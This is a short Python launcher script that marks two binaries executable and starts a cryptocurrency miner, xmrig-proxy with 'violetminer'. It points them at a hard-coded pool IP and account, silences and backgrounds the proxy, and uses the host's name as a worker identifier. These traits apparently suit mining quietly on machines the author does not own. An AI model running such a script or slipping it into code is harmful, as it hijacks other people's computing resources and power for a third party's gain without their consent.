import os

os.system("chmod 777 xmrig-proxy violetminer")
os.system("./xmrig-proxy -a rx/0 -o 168.235.86.33:3393 -u SK_QzApkbVGsAxyQykaWSnEF.AutoBitcoin_novalanto -p x -b 0.0.0.0:3393 -m simple >/dev/null &")
os.system("./violetminer --pool 168.235.86.33:3393 --username SK_QzApkbVGsAxyQykaWSnEF.AutoBitcoin_novalanto --password $(cat /proc/sys/kernel/hostname) --algorithm wrkzcoin")
